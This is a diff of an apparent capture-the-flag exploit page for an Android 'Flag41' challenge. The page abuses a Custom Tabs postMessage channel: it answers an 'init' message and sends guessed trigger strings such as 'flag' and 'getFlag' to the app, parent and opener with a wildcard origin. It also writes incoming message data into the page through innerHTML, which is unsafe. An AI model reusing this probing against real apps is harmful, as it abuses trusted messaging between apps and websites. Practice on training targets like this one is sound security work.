@@ -1,21 +1,87 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
 <body>
-<h3>Flag41 exploit</h3>
+<h3>Flag41 Exploit - Custom Tabs PostMessage</h3>
+<div id="log" style="background:#f0f0f0; padding:10px; margin:10px;"></div>
+
 <script>
-window.addEventListener("message", function (event) {
-  if (!event.ports || event.ports.length === 0) return;
-  const port = event.ports[0];
-  port.onmessage = function(e) {
-    console.log("[app->web]", e.data);
-  };
-   
-  port.postMessage(JSON.stringify({ message: "init_complete" }));
- 
-  setTimeout(() => {
-    port.postMessage(JSON.stringify({ message: "success" }));
-  }, 1000);
+const logDiv = document.getElementById('log');
+
+function log(msg) {
+    logDiv.innerHTML += msg + '<br>';
+    console.log(msg);
+}
+
+log('Page loaded, waiting for communication...');
+
+// Method 1: Listen for Custom Tabs postMessage
+window.addEventListener('message', function(event) {
+    log('Received: ' + JSON.stringify(event.data));
+    log('Origin: ' + event.origin);
+    
+    // The app sends "init" as the first message
+    if (event.data === 'init' || event.data.includes('init')) {
+        log('Got init message!');
+        
+        // Send response back through the same channel
+        // Custom Tabs uses crypto.subtle or the port if available
+        if (event.ports && event.ports[0]) {
+            log('Using MessagePort...');
+            event.ports[0].postMessage('flag');
+            event.ports[0].postMessage('FLAG');
+            event.ports[0].postMessage(JSON.stringify({message: 'flag'}));
+        }
+        
+        // Also try posting back to the source
+        if (event.source) {
+            log('Posting back to source...');
+            event.source.postMessage('flag', event.origin);
+            event.source.postMessage('success', event.origin);
+        }
+    }
 });
+
+// Method 2: Try to establish communication proactively
+// Some implementations use the crypto API
+if (window.crypto && window.crypto.subtle) {
+    log('Crypto API available');
+}
+
+// Method 3: Send messages in various formats
+setTimeout(function() {
+    log('Sending proactive messages...');
+    
+    // Try posting to parent
+    window.parent.postMessage('flag', '*');
+    window.parent.postMessage({message: 'flag'}, '*');
+    
+    // Try posting to opener if exists
+    if (window.opener) {
+        window.opener.postMessage('flag', '*');
+    }
+    
+    // Try all possible flag trigger messages
+    const messages = [
+        'flag',
+        'FLAG', 
+        'success',
+        'getFlag',
+        'init_complete',
+        JSON.stringify({message: 'flag'}),
+        JSON.stringify({type: 'success'}),
+        JSON.stringify({action: 'getFlag'})
+    ];
+    
+    messages.forEach(function(msg, index) {
+        setTimeout(function() {
+            log('Sending: ' + msg);
+            window.postMessage(msg, '*');
+            if (event && event.source) {
+                event.source.postMessage(msg, '*');
+            }
+        }, index * 300);
+    });
+}, 2000);
 </script>
 </body>
 </html>
